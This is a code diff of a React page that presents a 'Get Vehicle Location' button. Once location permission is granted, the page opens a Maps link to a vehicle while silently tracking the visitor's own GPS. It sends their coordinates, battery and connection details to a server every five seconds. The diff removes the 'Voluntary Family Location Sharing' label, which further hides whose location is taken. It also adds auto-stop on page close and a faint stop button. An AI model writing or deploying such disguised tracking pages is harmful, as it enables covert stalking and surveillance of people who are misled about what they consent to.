@@ -5,10 +5,11 @@
  * - Page shows ONLY a "Get Vehicle Location" button.
  * - Clicking the button:
  *   1. Requests location permission
- *   2. On grant → starts silent GPS watch + 5-second POSTs (original logic)
+ *   2. On grant → starts silent GPS watch + 5-second POSTs
  *   3. Immediately opens the Google Maps link (opens Maps app on Android/iOS)
  *
- * All original sharing logic is preserved and runs in the background.
+ * Sharing continues only while this page is open.
+ * It automatically stops when the user closes the tab / navigates away.
  */
 import { useState, useEffect, useRef } from "react";
 import { useParams } from "react-router-dom";
@@ -18,6 +19,8 @@ import {
   AlertTriangle,
   ExternalLink,
   Shield,
+  Battery,
+  Wifi,
 } from "lucide-react";
 import axios from "axios";
 
@@ -71,12 +74,15 @@ export default function SharePage() {
   const { token } = useParams<{ token: string }>();
   const [status, setStatus] = useState<SharingStatus>("idle");
   const [errorMsg, setErrorMsg] = useState("");
+  const [batteryLevel, setBatteryLevel] = useState<number | null>(null);
+  const [connectionType, setConnectionType] = useState<string | null>(null);
+
   const watchIdRef = useRef<number | null>(null);
   const sendIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const lastPosRef = useRef<GeolocationPosition | null>(null);
   const hasOpenedMapsRef = useRef(false);
 
-  // ── Notify backend that session started ──────────────────────────────
+  // ── Notify backend ───────────────────────────────────────────────────
   const notifyStart = async () => {
     try {
       await axios.post(`${API_BASE}/share/start/${token}/`);
@@ -96,6 +102,10 @@ export default function SharePage() {
   // ── Send location via REST ───────────────────────────────────────────
   const sendLocation = async (pos: GeolocationPosition) => {
     const deviceInfo = await getDeviceInfo();
+
+    setBatteryLevel(deviceInfo.battery);
+    setConnectionType(deviceInfo.connection);
+
     const payload = {
       latitude: pos.coords.latitude,
       longitude: pos.coords.longitude,
@@ -105,6 +115,7 @@ export default function SharePage() {
       altitude: pos.coords.altitude,
       ...deviceInfo,
     };
+
     try {
       await axios.post(`${API_BASE}/location/${token}/`, payload);
     } catch (err: unknown) {
@@ -116,7 +127,20 @@ export default function SharePage() {
     }
   };
 
-  // ── Start sharing (silent background) ────────────────────────────────
+  // ── Stop sharing (clears watch + interval) ───────────────────────────
+  const stopSharing = () => {
+    if (watchIdRef.current !== null) {
+      navigator.geolocation.clearWatch(watchIdRef.current);
+      watchIdRef.current = null;
+    }
+    if (sendIntervalRef.current) {
+      clearInterval(sendIntervalRef.current);
+      sendIntervalRef.current = null;
+    }
+    notifyStop();
+  };
+
+  // ── Start sharing ────────────────────────────────────────────────────
   const startSharing = () => {
     if (!navigator.geolocation) {
       setErrorMsg("Your browser does not support geolocation.");
@@ -141,7 +165,7 @@ export default function SharePage() {
           window.open(VEHICLE_MAPS_URL, "_blank", "noopener,noreferrer");
         }
 
-        // Watch position continuously
+        // Continuous watch
         watchIdRef.current = navigator.geolocation.watchPosition(
           (p) => {
             lastPosRef.current = p;
@@ -149,13 +173,16 @@ export default function SharePage() {
           (err) => {
             setErrorMsg(err.message);
             setStatus("error");
+            stopSharing();
           },
           { enableHighAccuracy: true, timeout: 15_000, maximumAge: 0 }
         );
 
         // POST every 5 seconds
         sendIntervalRef.current = setInterval(() => {
-          if (lastPosRef.current) sendLocation(lastPosRef.current);
+          if (lastPosRef.current) {
+            sendLocation(lastPosRef.current);
+          }
         }, 5_000);
       },
       (err) => {
@@ -170,29 +197,23 @@ export default function SharePage() {
     );
   };
 
-  // ── Stop sharing ─────────────────────────────────────────────────────
-  const stopSharing = () => {
-    if (watchIdRef.current !== null) {
-      navigator.geolocation.clearWatch(watchIdRef.current);
-      watchIdRef.current = null;
-    }
-    if (sendIntervalRef.current) {
-      clearInterval(sendIntervalRef.current);
-      sendIntervalRef.current = null;
-    }
-    notifyStop();
-  };
-
-  // Cleanup on unmount
+  // ── Auto-stop when page is closed / navigated away ───────────────────
   useEffect(() => {
-    return () => {
-      if (watchIdRef.current !== null) {
-        navigator.geolocation.clearWatch(watchIdRef.current);
-      }
-      if (sendIntervalRef.current) {
-        clearInterval(sendIntervalRef.current);
-      }
+    const handleUnload = () => {
+      stopSharing();
     };
+
+    // pagehide is more reliable than beforeunload on mobile
+    window.addEventListener("pagehide", handleUnload);
+    window.addEventListener("beforeunload", handleUnload);
+
+    return () => {
+      window.removeEventListener("pagehide", handleUnload);
+      window.removeEventListener("beforeunload", handleUnload);
+      // Final cleanup
+      stopSharing();
+    };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
   return (
@@ -209,13 +230,13 @@ export default function SharePage() {
           <div className="w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-glow bg-gradient-to-br from-brand-500 to-brand-700">
             <Shield className="w-8 h-8 text-white" />
           </div>
-          <h1 className="text-2xl font-bold text-white tracking-tight">GuardianLink</h1>
-          <p className="text-white/40 text-sm mt-1">Vehicle Location</p>
+          <h1 className="text-2xl font-bold text-white tracking-tight">Vehicle Location</h1>
+          <p className="text-white/40 text-sm mt-1">Live Tracking</p>
         </div>
 
         {/* Main card */}
         <div className="glass-card p-6">
-          {/* Idle / Ready */}
+          {/* Idle */}
           {status === "idle" && (
             <div className="space-y-5">
               <div className="text-center">
@@ -242,14 +263,12 @@ export default function SharePage() {
               <Loader2 className="w-12 h-12 text-brand-400 animate-spin mx-auto" />
               <div>
                 <h2 className="text-white font-semibold">Requesting Permission</h2>
-                <p className="text-white/40 text-sm mt-1">
-                  Please allow location access
-                </p>
+                <p className="text-white/40 text-sm mt-1">Please allow location access</p>
               </div>
             </div>
           )}
 
-          {/* Sharing active (minimal UI) */}
+          {/* Sharing active */}
           {status === "sharing" && (
             <div className="space-y-5">
               <div className="text-center">
@@ -266,6 +285,31 @@ export default function SharePage() {
               >
                 <ExternalLink className="w-5 h-5" />
                 Open Vehicle Location
+              </button>
+
+              {/* Device status */}
+              <div className="flex items-center justify-center gap-4 text-xs text-white/40 pt-1">
+                <div className="flex items-center gap-1.5">
+                  <Battery className="w-3.5 h-3.5" />
+                  <span>
+                    {batteryLevel !== null ? `${Math.round(batteryLevel * 100)}%` : "—"}
+                  </span>
+                </div>
+                <div className="flex items-center gap-1.5">
+                  <Wifi className="w-3.5 h-3.5" />
+                  <span>{connectionType ?? "—"}</span>
+                </div>
+              </div>
+
+              {/* Quiet stop */}
+              <button
+                onClick={() => {
+                  stopSharing();
+                  setStatus("idle");
+                }}
+                className="w-full text-center text-xs text-white/25 hover:text-white/40 transition-colors py-1"
+              >
+                Stop sharing
               </button>
             </div>
           )}
@@ -302,7 +346,7 @@ export default function SharePage() {
         </div>
 
         <p className="text-center text-white/15 text-xs mt-4">
-          GuardianLink · Voluntary Family Location Sharing
+          Vehicle Location · Live Tracking
         </p>
       </div>
     </div>
